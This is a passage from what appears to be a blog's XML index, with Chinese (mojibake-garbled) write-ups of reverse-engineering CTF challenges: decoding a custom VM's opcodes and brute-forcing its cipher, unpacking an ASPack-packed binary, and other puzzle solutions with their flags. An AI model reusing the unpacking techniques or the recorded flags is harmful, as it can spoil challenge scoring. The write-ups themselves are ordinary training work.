class="subst">&#123;code1&#125;</span>] += <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] += s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">6</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] *= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] *= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">8</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] //= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">9</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] //= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">10</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">11</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">12</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[<span class="subst">&#123;code1&#125;</span>] &lt;&lt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">13</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[0] &lt;&lt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">14</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">15</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;print(s[<span class="subst">&#123;code1&#125;</span>])&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">16</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i -= 1&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;print(s[<span class="subst">&#123;i + <span class="number">16</span>&#125;</span>])&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">17</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i = <span class="subst">&#123;code2&#125;</span> if not s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">18</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i = <span class="subst">&#123;code2&#125;</span> if s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="comment"># elif code0 == 19:</span></span><br><span class="line">            <span class="comment">#     # i = code1</span></span><br><span class="line">            <span class="comment"># elif code0 == 20:</span></span><br><span class="line">            <span class="comment">#     # s[code1] = s[code1]</span></span><br><span class="line">            <span class="comment"># elif code0 == 21:</span></span><br><span class="line">            <span class="comment">#     # i -= 1</span></span><br><span class="line">            <span class="comment">#     # s[0] = s[i + 16]</span></span><br><span class="line">            <span class="comment"># elif code0 == 22:</span></span><br><span class="line">            <span class="comment">#     # s[i + 16] = code1</span></span><br><span class="line">            <span class="comment"># elif code0 == 23:</span></span><br><span class="line">            <span class="comment">#     break</span></span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">24</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[0] = byte_100008002 | byte_100008001&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">25</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[0] &gt;&gt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">26</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(b):</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">0</span>] = flag[i]</span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">1</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">7</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">3</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">2</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">6</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">4</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">3</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">5</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">5</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">4</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">4</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">6</span>]</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä¸ç†è§£çš„æ˜¯byte_100008002å’Œbyte_100008001çš„å€¼ï¼Œä¸ç„¶æ²¡æ³•æˆ–ã€‚ã€‚<br>å»ç½‘ä¸Šçœ‹äº†wp,çœ‹åˆ°äº†å®ƒä»¬çš„dword_100008003å’Œè¿™ä¸¤ä¸ªå€¼æ˜¯ä¸€æ ·çš„<br>ï¼ˆç„¶åæ‰å‘ç°é‚£å››ä¸ªå€¼åœ¨ä¸€èµ·æ˜¯ä¸ªæ•°ç»„ï¼Œå‰é¢è¿˜æœ‰3ä¸ªå¯„å­˜å™¨ï¼Œå°±æ˜¯ä¸Šé¢ä»£ç çš„s0,s1,s2ï¼‰<br>å°±æ˜¯</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">arr</span> = <span class="number">0</span>xDEEDBEEF.to_bytes(<span class="number">4</span>,<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºè¿™ä¸ªdwordæ˜¯s = [0,0,0xEF,0xBE,0xED,0xDE]æ”¾åœ¨è¿™å››ä¸ªä½ç½®ä¸Š,å› ä¸ºdeadbeefæ˜¯ç¬¬å››ä¸ªä¸Šé¢æ”¾ç€<br>å†™ä¸€ä¸‹è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, </span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, </span><br><span class="line">        <span class="number">0x85</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, </span><br><span class="line">        <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params">k</span>):</span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            t = (s &gt;&gt; <span class="number">1</span> | (s &lt;&lt; <span class="number">7</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xef</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">2</span> | (t &lt;&lt; <span class="number">6</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xbe</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">3</span> | (t &lt;&lt; <span class="number">5</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xed</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">4</span> | (t &lt;&lt; <span class="number">4</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xde</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">5</span> | (t &lt;&lt; <span class="number">3</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">            <span class="keyword">if</span> (t == k[i]):</span><br><span class="line">                q.append(s)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line">pl(back(last))</span><br></pre></td></tr></table></figure><p>?ä¸ºä»€ä¹ˆå‡ºä¸æ¥ï¼Œå¥½å¥½å¥½ï¼Œä¸æ˜¯deadbeefæ˜¯beedbeefæ˜¯å§,6,æ”¹å¥½ä¹‹å</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DASCTF</span><span class="template-variable">&#123;you_are_right_so_cool&#125;</span></span><br></pre></td></tr></table></figure><hr><p>åšå®Œè¿™å‡ é“é¢˜ï¼Œæ„Ÿè§‰vmä¸»è¦è€ƒæŠŠopcodeè½¬æ±‡ç¼–ï¼Œå†æŠŠæ±‡ç¼–è½¬å¯è¯»ä»£ç çš„é™æ€åˆ†æèƒ½åŠ›ï¼Œè¿™é‡Œè¦åˆ†æå‡ºregï¼Œstackçš„å®ç°æ˜¯å“ªäº›ä»£ç ï¼Œå¦‚æœèƒ½æ‹¿åˆ°opcodeï¼Œå°±èƒ½åˆ†æå‡ºå…¶ä¸­å¯èƒ½ä¸ç”¨çš„caseï¼Œçœå»ä¸€äº›æ—¶é—´</p><p>è€Œä¸”ä¸€èˆ¬æ˜¯ç”¨å•å­—èŠ‚åŠ å¯†ï¼Œæ‰€ä»¥åé¢å¯ä»¥çˆ†ç ´ç­”æ¡ˆï¼Œ</p><p>å¦‚æœç”¨pythonå†™è„šæœ¬ï¼Œè¦æ³¨æ„å·¦ç§»æ—¶è¦é™å®šèŒƒå›´ä¸ç„¶ä¼šå¾—ä¸åˆ°æ­£ç¡®ç»“æœ</p><p>æœ€ååœ¨ç¬¬ä¸‰é“é¢˜ï¼Œidaç‰ˆæœ¬èƒ½ç›´æ¥å½±å“åˆ°åç¼–è¯‘çš„ç»“æœï¼Œæœ€åç”¨7.5ç‰ˆæœ¬æ‰èƒ½æ­£ç¡®åç¼–è¯‘å‡ºæ¥</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> ç»¼åˆä¿æŠ¤ </category>
          
          <category> VM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>polar_reéƒ¨åˆ†wp</title>
      <link href="/posts/5a6db6c8.html"/>
      <url>/posts/5a6db6c8.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªpolarçš„reæ„Ÿè§‰è´¨é‡å¥½ä½ï¼Œä¸æ˜¯å¤ªç®€å•å°±æ˜¯å¤ªæ¶å¿ƒï¼Œå†™äº†5é“ä¸æƒ³å†™äº†QAQ</p><h3 id="test">test</h3><p>ç”¨apktoolè§£åŒ…ï¼Œåœ¨assetsæ–‡ä»¶ä¸­æŠŠzipæ–‡ä»¶åæ”¹æˆpngå¾—åˆ°flag</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;money<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>othing&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜è¢«å‘äº†ä¸€ä¸ªæ™šä¸Šï¼Œå› ä¸ºä¸€å¼€å§‹å°è¯•é™æ€åˆ†æä¸€å…³ä¸€å…³è¿‡ï¼Œç»“æœè§£åŒ…ä¹‹åflagåœ¨å›¾ç‰‡é‡Œé¢ï¼Œä¹‹åçœ‹åˆ°è¿™ç§å¯ä»¥é€†å‡ºèµ„æºçš„å¯ä»¥å…ˆå°è¯•æŠŠèµ„æºæ‰¾å‡ºæ¥ï¼Œè¯´ä¸å®šå°±æ˜¯flagï¼Œ<s>å»ºè®®æŠŠè¿™é“é¢˜æ”¾åˆ°misc</s></p><h3 id="è€å…«å°å†’é™©">è€å…«å°å†’é™©</h3><p>è¿™ä¸ªé¢˜æŒºç®€å•çš„ï¼Œç”šè‡³éƒ½æ˜¯åŸå§‹å·¥ç¨‹æ–‡ä»¶ï¼Œæ²¡æœ‰æ‰“åŒ…ä¹Ÿä¸ç”¨è§£åŒ…</p><p>ç›´æ¥ç”¨rpgmaker vx aceæ‰“å¼€ï¼Œç›´æ¥çœ‹äº‹ä»¶å°±å¥½äº†</p><p>jbkjckjsdsfdsfjbkjckjçš„md5</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">60</span>b<span class="number">6</span>cd<span class="number">0848639100</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">04</span>d<span class="number">4884</span>db<span class="number">1e8</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="é€¢ä¸ƒå¿…å˜">é€¢ä¸ƒå¿…å˜</h3><p>ç¬¬ä¸€æ¬¡è§åˆ°aspackå£³ï¼Œå°è¯•æœç´¢å·¥å…·è„±å£³,æ‰¾åˆ°äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä½¿ç”¨ï¼Œç»“æœå·¥å…·æœ‰é—®é¢˜ï¼Œçœ‹æ¥è¿˜æ˜¯è¦ä¸€æ­¥ä¸€æ­¥è°ƒ</p><p>æ‰“å¼€ä¹‹åï¼Œé‡Œé¢çš„ä»£ç å¥½åƒå¾ˆå¥‡æ€ªï¼Œä»£ç çœ‹ä¸æ‡‚ï¼Œä¸€å¼€å§‹callç„¶ååˆè¿”å›ï¼Œä¸ç†è§£ï¼Œespå®šå¾‹ä¸€å¼€å§‹ä¹Ÿä¸å¥½ä½¿/</p><p>å¥½å§ï¼Œå› ä¸ºè¿™ä¸ªç‰¹å¾ä¸ä¸€æ ·ï¼Œè¿™ä¸ªaspackå£³çš„ç‰¹ç‚¹æ˜¯ä¸€å¼€å§‹popadï¼Œç„¶åcallï¼Œæœ€åpopadï¼Œç„¶åretï¼Œåœ¨popadå®Œå¯¹espä¸‹æ–­ç‚¹ç„¶åç‚¹å‡»è¿è¡Œï¼Œå¯ä»¥ç›´æ¥åˆ°retçš„ä½ç½®ï¼Œä¹‹åf7ä¸€ä¸‹ï¼Œåº”è¯¥å¯ä»¥åˆ°ä¸€ä¸ªcallåŠ jmpçš„ä½ç½®ï¼Œè¿™é‡Œå°±æ˜¯oep</p><p><img src="https://s2.loli.net/2024/03/04/6QyLedptHSumvg7.png" alt="image-20240304193949183"></p><p>åœ¨è¿™ä¸ªä½ç½®dumpï¼Œç„¶åæ‰“å¼€dumpçš„æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+14h] [ebp-110h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [esp+20h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;akf`|7fda1005c?1b253bc17346b5c77bab?0z&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6[<span class="number">39</span>], <span class="number">0</span>, <span class="number">0xD9</span>u);</span><br><span class="line">  len = <span class="built_in">strlen</span>(v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    v6[i] ^= <span class="number">7u</span>;</span><br><span class="line">  sub_5F1040(<span class="string">&quot;You got it!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæœ‰æ‰‹å°±è¡Œäº†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">0</span>acf6772d86e524ed60431e2d00efe87&#125;</span><br></pre></td></tr></table></figure><h3 id="é«˜å¢æˆ˜è®°">é«˜å¢æˆ˜è®°</h3><p>ç›´æ¥idaæ‰“å¼€objæ–‡ä»¶ï¼Œçœ‹mainå‡½æ•°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">6f759f8f7</span>:deg::<span class="number">796486</span>&lt;<span class="number">8</span>&lt;<span class="number">8</span>edf9:<span class="number">73</span></span><br></pre></td></tr></table></figure><p>åªæœ‰ä¸€ä¸ªè¿™ä¸ªç„¶åå°±è¾“å‡ºäº†è¿™ä¸ª</p><p>ä¸€å¼€å§‹çœ‹ä¸æ‡‚</p><p>ç»“æœã€‚ã€‚å› ä¸ºã€Šé«˜å¢æˆ˜è®°ã€‹æ˜¯å‡¯æ’’å†™çš„ï¼Œä¹¦é‡Œé¢ç”¨çš„3çš„ä½ç§»ï¼Œæ‰€ä»¥è¦ç”¨-3</p><p>è¿™æ ·æ¥å‡ºæ¥å°±æ˜¯flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">3</span><span class="keyword">c</span><span class="number">426</span><span class="keyword">c</span><span class="number">5</span><span class="keyword">c</span><span class="number">47</span>abd<span class="number">774631539595</span>bac<span class="number">6740</span>&#125;</span><br></pre></td></tr></table></figure><p>çœŸæ¶å¿ƒï¼Œä¸ºä»€ä¹ˆä¸æ˜¯misc</p><h3 id="æœ€çŸ­è·¯">æœ€çŸ­è·¯</h3><p>ç›´æ¥å¾—åˆ°æœ€çŸ­26</p><p>ç”»å›¾æˆ–è€…aiï¼ˆæ¯”aiè¿˜å¿«ï¼‰</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">from</span> <span class="string">prism</span> <span class="string">import</span> <span class="string">*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">import</span> <span class="string">heapq</span></span><br><span class="line"></span><br><span class="line"><span class="string">def</span> <span class="string">dijkstra(graph,</span> <span class="string">start,</span> <span class="string">end):</span></span><br><span class="line">    <span class="string">heap</span> <span class="string">=</span> [<span class="string">(0</span>, <span class="string">start)</span>]</span><br><span class="line">    <span class="string">distances</span> <span class="string">=</span> &#123;<span class="attr">node:</span> <span class="string">float(&#x27;infinity&#x27;)</span> <span class="string">for</span> <span class="string">node</span> <span class="string">in</span> <span class="string">graph</span>&#125;</span><br><span class="line">    <span class="string">distances[start]</span> <span class="string">=</span> <span class="number">0</span></span><br><span class="line">    <span class="string">paths</span> <span class="string">=</span> &#123;<span class="attr">start:</span> []&#125;</span><br><span class="line"></span><br><span class="line">    <span class="attr">while heap:</span></span><br><span class="line">        <span class="string">(dist,</span> <span class="string">current)</span> <span class="string">=</span> <span class="string">heapq.heappop(heap)</span></span><br><span class="line">        <span class="string">if</span> <span class="string">dist</span> <span class="string">&gt;</span> <span class="string">distances[current]:</span></span><br><span class="line">            <span class="string">continue</span></span><br><span class="line">        <span class="string">for</span> <span class="string">neighbor,</span> <span class="string">neighbor_dist</span> <span class="string">in</span> <span class="string">graph[current].items():</span></span><br><span class="line">            <span class="string">old_dist</span> <span class="string">=</span> <span class="string">distances[neighbor]</span></span><br><span class="line">            <span class="string">new_dist</span> <span class="string">=</span> <span class="string">dist</span> <span class="string">+</span> <span class="string">neighbor_dist</span></span><br><span class="line">            <span class="string">if</span> <span class="string">new_dist</span> <span class="string">&lt;</span> <span class="attr">old_dist:</span></span><br><span class="line">                <span class="string">distances[neighbor]</span> <span class="string">=</span> <span class="string">new_dist</span></span><br><span class="line">                <span class="string">paths[neighbor]</span> <span class="string">=</span> <span class="string">paths[current]</span> <span class="string">+</span> [<span class="string">neighbor</span>]</span><br><span class="line">                <span class="string">heapq.heappush(heap,</span> <span class="string">(new_dist,</span> <span class="string">neighbor))</span></span><br><span class="line">    <span class="string">return</span> <span class="string">distances[end],</span> <span class="string">paths[end]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰å›¾çš„è¾¹å’Œæƒé‡</span></span><br><span class="line"><span class="string">graph</span> <span class="string">=</span> &#123;</span><br><span class="line">    <span class="attr">1:</span> &#123;<span class="attr">2:</span> <span class="number">2</span>, <span class="attr">3:</span> <span class="number">3</span>&#125;,</span><br><span class="line">    <span class="attr">2:</span> &#123;<span class="attr">3:</span> <span class="number">5</span>, <span class="attr">4:</span> <span class="number">3</span>, <span class="attr">10:</span> <span class="number">20</span>&#125;,</span><br><span class="line">    <span class="attr">3:</span> &#123;<span class="attr">5:</span> <span class="number">6</span>, <span class="attr">8:</span> <span class="number">5</span>&#125;,</span><br><span class="line">    <span class="attr">4:</span> &#123;<span class="attr">5:</span> <span class="number">7</span>&#125;,</span><br><span class="line">    <span class="attr">5:</span> &#123;<span class="attr">9:</span> <span class="number">4</span>, <span class="attr">8:</span> <span class="number">1</span>&#125;,</span><br><span class="line">    <span class="attr">6:</span> &#123;<span class="attr">7:</span> <span class="number">3</span>&#125;,</span><br><span class="line">    <span class="attr">7:</span> &#123;<span class="attr">14:</span> <span class="number">6</span>&#125;,</span><br><span class="line">    <span class="attr">8:</span> &#123;<span class="attr">11:</span> <span class="number">5</span>, <span class="attr">15:</span> <span class="number">21</span>&#125;,</span><br><span class="line">    <span class="attr">9:</span> &#123;<span class="attr">12:</span> <span class="number">5</span>&#125;,</span><br><span class="line">    <span class="attr">10:</span> &#123;&#125;,</span><br><span class="line">    <span class="attr">11:</span> &#123;<span class="attr">15:</span> <span class="number">13</span>&#125;,</span><br><span class="line">    <span class="attr">12:</span> &#123;<span class="attr">15:</span> <span class="number">9</span>&#125;,</span><br><span class="line">    <span class="attr">14:</span> &#123;<span class="attr">15:</span> <span class="number">7</span>&#125;,</span><br><span class="line">    <span class="attr">15:</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡ŒDijkstraç®—æ³•</span></span><br><span class="line"><span class="string">distance,</span> <span class="string">path</span> <span class="string">=</span> <span class="string">dijkstra(graph,</span> <span class="number">1</span><span class="string">,</span> <span class="number">15</span><span class="string">)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="string">print(f&quot;æœ€çŸ­è·ç¦»:</span> &#123;<span class="string">distance</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">print(f&quot;</span><span class="string">è·¯å¾„:</span> &#123;<span class="string">&#x27; -&gt; &#x27;</span><span class="string">.join(map(str</span>, <span class="string">path))</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">pmd5(&quot;</span><span class="number">1381115</span><span class="string">&quot;)</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">4991</span>ce1781b53409a7a84e2baf9431d6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ‚é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é’å°‘å¹´ctf#1 wp</title>
      <link href="/posts/c4803d60.html"/>
      <url>/posts/c4803d60.html</url>
      
